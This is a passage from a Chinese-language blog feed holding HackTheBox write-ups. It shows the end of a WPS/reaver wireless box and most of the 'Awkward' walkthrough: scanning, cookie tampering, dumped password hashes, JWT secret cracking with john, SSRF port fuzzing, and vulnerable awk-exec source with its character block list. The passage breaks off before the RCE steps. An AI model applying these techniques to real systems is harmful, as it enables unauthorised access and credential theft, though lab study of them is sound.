<li><code>-i mon0</code>: æŒ‡å®šè¦ç”¨äºæ— çº¿ç›‘æ§çš„ç½‘ç»œæ¥å£çš„åç§°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŒ‡å®šçš„æ¥å£æ˜¯ <code>mon0</code>ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªç”¨äºç›‘å¬æ— çº¿ç½‘ç»œæµé‡çš„ç›‘è§†æ¨¡å¼æ¥å£ã€‚<code>mon0</code> æ¥å£é€šå¸¸æ˜¯é€šè¿‡ <code>airmon-ng</code> ç­‰å·¥å…·åˆ›å»ºçš„ã€‚</li>
<li><code>-b 02:00:00:00:00:00</code>: æŒ‡å®šç›®æ ‡æ— çº¿ç½‘ç»œçš„BSSIDï¼ˆåŸºæœ¬æœåŠ¡é›†æ ‡è¯†ç¬¦ï¼‰ã€‚</li>
<li><code>-vv</code>: å¢åŠ å‘½ä»¤çš„è¯¦ç»†åº¦ï¼Œä½¿å…¶è¾“å‡ºæ›´å¤šçš„è°ƒè¯•ä¿¡æ¯ã€‚<code>-v</code> è¡¨ç¤ºâ€œè¯¦ç»†æ¨¡å¼â€ï¼ˆverbose modeï¼‰ï¼Œä½¿ç”¨ä¸¤ä¸ª <code>-v</code> è¡¨ç¤ºæ›´è¯¦ç»†çš„è¾“å‡ºã€‚</li>
<li><code>-c 1</code>: æŒ‡å®šç›®æ ‡æ— çº¿ç½‘ç»œçš„ä¿¡é“å·ã€‚æ­¤å¤„ä¿¡é“å·æ˜¯ <code>1</code>ï¼Œè¡¨ç¤º <code>reaver</code> å°†å°è¯•ç ´è§£ä¸è¯¥ä¿¡é“å…³è”çš„ç›®æ ‡ç½‘ç»œçš„WPS PINã€‚</li>
</ol>
</blockquote>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163336425.png"></p>
<p>æˆåŠŸè·å–WPA PSKï¼Œå°è¯•ä»¥rootèº«ä»½ç™»å½•ï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">WhatIsRealAnDWhAtIsNot51121!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163601175.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922211703945.png" style="zoom:67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>æ— çº¿ç½‘ç»œ</tag>
        <tag>ä¿¡æ¯æ³„éœ²</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Awkward</title>
    <url>/posts/d776b19d.html</url>
    <content><![CDATA[<h1 id="HTB-Awkward"><a href="#HTB-Awkward" class="headerlink" title="HTB-Awkward"></a>HTB-Awkward</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li>ä¿¡æ¯æ”¶é›†å‘ç°JWTå’ŒSSRFï¼›</li>
<li>SSRFå‘ç°ç«™ç‚¹APIï¼›</li>
<li>å®¡è®¡APIæºç ï¼Œå‘ç°å¯ä¼ªé€ JWTæ‰§è¡Œawkå‘½ä»¤å®ç°LFIæ‹¿åˆ°beanç”¨æˆ·sshï¼›</li>
<li>è¿ä¸Šsshæ‰¾åˆ°è´­ç‰©è½¦æºç ï¼Œnginxæ•æ„Ÿæ–‡ä»¶æ³„éœ²æ‰¾åˆ°adminè´¦æˆ·ï¼›</li>
<li>å®¡è®¡è´­ç‰©è½¦æºç ï¼Œå‘ç°åˆ é™¤è´­ç‰©è½¦åŠŸèƒ½å¯åˆ©ç”¨sedå‘½ä»¤å®ç°RCEï¼›</li>
<li>RCEåå¼¹shellè·å–www-dataç”¨æˆ·æƒé™ï¼›</li>
<li>æ‰§è¡Œpspy64å‘ç°mailå‘½ä»¤åŠå…¶ç›®æ ‡æ–‡ä»¶leave_requests.csvï¼›</li>
<li>åˆ©ç”¨mailå‘½ä»¤å’Œleave_requests.csvåå¼¹shellè·å–rootæƒé™ã€‚</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>Nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# nmap -sC -sV 10.10.11.185          
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 21:53 EST
Nmap scan report for 10.10.11.185
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.48 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰</p>
<p>80ç«¯å£å¼€æ”¾ï¼Œç›´æ¥URLæ‰“å¼€IPï¼Œè·³è½¬åˆ°hat-valley.htbï¼Œé‚£å°±æ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.185 hat-valley.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217110323853.png"></p>
<p>ç›®å½•æ‰«æ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217111135831.png"></p>
<p>ç»§ç»­æ‰«jsç›®å½•</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217142128172.png"></p>
<p>app.jsæœhrefï¼Œå‘ç°å‡ ä¸ªå¯ç–‘ç›®å½•<code>/dashboard</code>ã€<code>/leave</code>ã€<code>/hr</code>ï¼Œä¾æ¬¡æ‰“å¼€ï¼Œå‘ç°å…¨éƒ¨éƒ½ä¼šè·³è½¬åˆ°<code>/hr</code>ï¼Œæ˜¯ä¸ªç™»å½•ç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220101615666.png" style="zoom:67%;">

<p>éšä¾¿è¯•ï¼Œéƒ½ä¼šæŠ¥ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œç”¨BurpæŠ“åŒ…å‘ç°Cookieå­—æ®µæœ‰<code>token=guest</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220102134970.png" alt="image-20230220102134970"></p>
<p>burpç›´æ¥ä¿®æ”¹æˆ<code>token=admin</code>æˆ–è€…<code>token=administrator</code>ï¼Œé‡æ”¾è¯·æ±‚åŒ…ï¼Œè¿˜æ˜¯ä¸è¡Œ</p>
<p>ç”¨æ’ä»¶Cookie Editorç¼–è¾‘tokenå€¼ä¸ºadminï¼Œåˆ·æ–°é¡µé¢ï¼Œå‘ç°é¡µé¢è·³è½¬åˆ°<code>/dashboard</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104116943.png"></p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥æµè§ˆå™¨<code>F12</code>â†’<code>Storage</code>â†’<code>Cookies</code>ä¿®æ”¹ã€åˆ·æ–°é¡µé¢ï¼Œä¸€æ ·çš„æ•ˆæœ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105152758.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104309900.png"></p>
<p>æ‰“å¼€å·¦ä¾§èœå•æ ã€Leave Requestsã€‘é¡µé¢ï¼Œç•™æ„åˆ°æ‰€æœ‰çš„ç¦»å¼€è¯·æ±‚ä¼šç”±Christineå®¡æ ¸ï¼ŒçŒœæµ‹Christineåº”è¯¥æ˜¯ä¸ªæƒé™ä¸å°çš„è´¦æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221102637260.png"></p>
<p>ç„¶ååœ¨<code>F12</code>â†’<code>Network</code>â†’<code>XHR</code>ï¼ˆ<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send">XMLHttpRequest</a>ï¼‰çœ‹åˆ°æœ‰ä¸¤ä¸ªapiæ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105826149.png"></p>
<p>åˆ†åˆ«è®¿é—®<code>http://hat-valley.htb/api/staff-details</code>å’Œ<code>http://hat-valley.htb/api/store-status</code>ï¼Œ<code>/api/store-status</code>é¡µé¢æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œ<code>/api/staff-details</code>æœ‰<code>jwt malformed</code>æŠ¥é”™ä¿¡æ¯</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220130856612.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">JsonWebTokenError: jwt malformed
    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
    at /var/www/hat-valley.htb/server/server.js:151:30
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>jwt malformed</code>æŠ¥é”™æ˜¯å› ä¸ºå‰ç«¯ä¸Šä¼ tokençš„æ—¶å€™æ²¡æœ‰è¿›è¡Œéç©ºéªŒè¯ï¼Œå¯¼è‡´tokenä¼ ç»™äº†æœåŠ¡ç«¯ï¼Œè¿™æ ·å°±å’ŒæœåŠ¡ç«¯ç”Ÿæˆçš„tokené‡å¤äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ç”¨CookieEditoræ’ä»¶æˆ–è€…F12åˆ é™¤cookieçš„tokenå­—æ®µï¼Œä¹Ÿå°±æ˜¯åˆ é™¤cookieï¼Œåˆ·æ–°é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªç”¨æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221100317693.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">username	"christine.wool"
password	"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"
username	"christopher.jones"
password	"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"
username	"jackson.lightheart"
password	"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"
username	"bean.hill"
password	"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç›®æµ‹æ˜¯<code>64*4=256</code>ä½Hashï¼Œåœ¨çº¿è§£ä¸€ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221101810630.png"></p>
<p>è§£å‡ºæ¥ä¸€ä¸ªç”¨æˆ·</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">christopher.jones
chris123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆæˆ‘ä»¬é‡æ–°å›åˆ°<code>http://hat-valley.htb/hr</code>é¡µé¢ï¼Œç™»å½•è¿™ä¸ªè´¦æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221103219519.png"></p>
<p>çœ‹åˆ°<code>Staff Details</code>ï¼Œæœç„¶ï¼Œå‰é¢çš„åˆ¤æ–­æ²¡é”™ï¼ŒChristineæ˜¯CEOï¼Œæƒé™ä¸å°ï¼Œè¿˜æœ‰ä¸¤ä¸ªé”€å”®å’Œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜</p>
<p>å¹¶ä¸”æ‹¿åˆ°äº†JWT token</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303104140690.png"></p>
<p>ç”¨è„šæœ¬æŠŠè¿™ä¸ªJWT tokenè½¬æ¢æˆjohnæ ¼å¼ï¼Œç„¶åç”¨johnå·¥å…·ç ´è§£</p>
<p><a href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py">https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py</a></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI &gt; jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> jwt<span class="token punctuation">.</span>utils <span class="token keyword">import</span> base64url_decode
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> hexlify


<span class="token keyword">def</span> <span class="token function">jwt2john</span><span class="token punctuation">(</span>jwt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """</span>
    jwt_bytes <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
    parts <span class="token operator">=</span> jwt_bytes<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    signature <span class="token operator">=</span> hexlify<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">b'#'</span> <span class="token operator">+</span> signature<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: %s JWT"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        john <span class="token operator">=</span> jwt2john<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; john -w=/usr/share/wordlists/rockyou.txt jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303115143339.png"></p>
<p>è·å–åˆ°JWT tokençš„secretå€¼ä¸º<code>123beany123</code>ï¼Œç”¨<code>JWT Debugger</code>å°è¯•ï¼Œæš‚æ—¶æ²¡å‘ç°ä»€ä¹ˆ</p>
<h2 id="ä¸‰ã€SSRF"><a href="#ä¸‰ã€SSRF" class="headerlink" title="ä¸‰ã€SSRF"></a>ä¸‰ã€SSRF</h2><p>æƒ³èµ·åˆšæ‰å‘ç°çš„å¦ä¸€ä¸ªAPIï¼Œ<code>api/store-status?url="http://store.hat-valley.htb"</code>ï¼Œå¯èƒ½å­˜åœ¨SSRF</p>
<p>å°è¯•<code>http://127.0.0.1:80</code>ï¼Œè¢«é‡å®šå‘åˆ°<code>http://store.hat-valley.htb</code>ï¼Œè¯å®å­˜åœ¨SSRF</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http://hat-valley.htb/api/store-status?url="http://127.0.0.1:80"--&gt;http://store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133754827.png"></p>
<p>ä¸‰ä¸ªç«¯å£80ã€3002ã€8080</p>
<p>3002æ˜¯APIæ–‡ä»¶ï¼Œè®°å½•äº†ç«™ç‚¹çš„APIä¿¡æ¯åŠå…¶æºç ï¼ŒAPIåç§°å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Login (/api/login)
Submit Leave (/api/submit-leave)
All Leave (/api/all-leave)
Store Status (/api/store-status)
Staff Details (/api/staff-details)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133933056.png"></p>
<p>8080é¡µé¢ç©ºç™½ï¼Œçœ‹æºç å‘ç°hat-valleyä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œè¦æ±‚å¼€å¯JavaScriptæ‰èƒ½æ­£å¸¸å·¥ä½œï¼Œæ²¡ä»€ä¹ˆç”¨</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303134214112.png"></p>
<h2 id="å››ã€LFI"><a href="#å››ã€LFI" class="headerlink" title="å››ã€LFI"></a>å››ã€LFI</h2><p>åœ¨å…¶ä¸­ä¸€ä¸ªAPIæºç å‘ç°æ¼æ´ç‚¹ï¼Œåœ¨28è¡Œexecå‡½æ•°é‡Œï¼Œæœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°userï¼Œé€šè¿‡æ“çºµå‚æ•°userï¼Œæ‰§è¡Œ<a href="https://www.runoob.com/linux/linux-comm-awk.html">awkå‘½ä»¤</a>è¯»å–æ–‡ä»¶ï¼ˆPSï¼šé¢˜ç›®åç§°AwkwardåŸæ¥ä½“ç°åœ¨è¿™ï¼‰ã€‚è€Œuserå€¼çš„è·å–ï¼Œå¾€å‰è¿½æº¯ä»£ç ï¼Œå‘ç°æ˜¯é€šè¿‡decodedTokenï¼Œç„¶åå–usernameå­—æ®µå¾—åˆ°çš„ã€‚</p>
<p>å†å¾€å‰è¿½æº¯åˆ°å¤´ï¼Œå‘ç°æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ä¼ é€’é“¾ï¼ŒTOKEN_SECRETå‰é¢å·²ç»è·å¾—ï¼Œå€¼ä¸º<code>123beany123</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡JWTä¼ªé€ è¯·æ±‚å¤´ä¸­Cookieå­—æ®µçš„tokenå€¼ï¼Œä»è€Œæ“çºµuserå€¼è¯»å–æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303161247753.png"></p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">app<span class="token dyadic-operator operator">.</span>get<span class="token punctuation">(</span><span class="token string">'/api/all-leave'</span><span class="token function">,</span> <span class="token punctuation">(</span>req<span class="token function">,</span> res<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
  const user_token <span class="token function">=</span> req<span class="token dyadic-operator operator">.</span>cookies<span class="token dyadic-operator operator">.</span>token
  var authFailed <span class="token function">=</span> false
  var user <span class="token function">=</span> null
  if<span class="token punctuation">(</span>user_token<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    const decodedToken <span class="token function">=</span> jwt<span class="token dyadic-operator operator">.</span>verify<span class="token punctuation">(</span>user_token<span class="token function">,</span> TOKEN_SECRET<span class="token punctuation">)</span>
    if<span class="token punctuation">(</span><span class="token function">!</span>decodedToken<span class="token dyadic-operator operator">.</span>username<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      authFailed <span class="token function">=</span> true
    <span class="token dfn builtin">}</span>
    else <span class="token dfn builtin">{</span>
      user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
    <span class="token dfn builtin">}</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span>authFailed<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>json<span class="token punctuation">(</span><span class="token dfn builtin">{</span>Error<span class="token dfn builtin">:</span> "Invalid Token"<span class="token dfn builtin">}</span><span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span><span class="token function">!</span>user<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Invalid user"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  const bad <span class="token function">=</span> <span class="token punctuation">[</span>"<span class="token punctuation">;</span>"<span class="token function">,</span>"<span class="token monadic-operator operator">&amp;</span>"<span class="token function">,</span>"<span class="token function">|</span>"<span class="token function">,</span>"<span class="token function">&gt;</span>"<span class="token function">,</span>"<span class="token function">&lt;</span>"<span class="token function">,</span>"<span class="token function">*</span>"<span class="token function">,</span>"<span class="token function">?</span>"<span class="token function">,</span>"`"<span class="token function">,</span>"$"<span class="token function">,</span>"<span class="token punctuation">(</span>"<span class="token function">,</span>"<span class="token punctuation">)</span>"<span class="token function">,</span>"<span class="token dfn builtin">{</span>"<span class="token function">,</span>"<span class="token dfn builtin">}</span>"<span class="token function">,</span>"<span class="token punctuation">[</span>"<span class="token function">,</span>"<span class="token punctuation">]</span>"<span class="token function">,</span>"<span class="token function">!</span>"<span class="token function">,</span>"<span class="token constant">#</span>"<span class="token punctuation">]</span>

  const badInUser <span class="token function">=</span> bad<span class="token dyadic-operator operator">.</span>some<span class="token punctuation">(</span>char <span class="token function">=</span><span class="token function">&gt;</span> user<span class="token dyadic-operator operator">.</span>includes<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  if<span class="token punctuation">(</span>badInUser<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Bad character detected<span class="token dyadic-operator operator">.</span>"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>

  exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span><span class="token function">,</span> <span class="token punctuation">(</span>error<span class="token function">,</span> stdout<span class="token function">,</span> stderr<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
    if<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>new Buffer<span class="token punctuation">(</span>stdout<span class="token function">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>stderr<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>

  <span class="token dfn builtin">}</span><span class="token punctuation">)</span>

<span class="token dfn builtin">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³é”®ä»£ç </p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl"><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span>
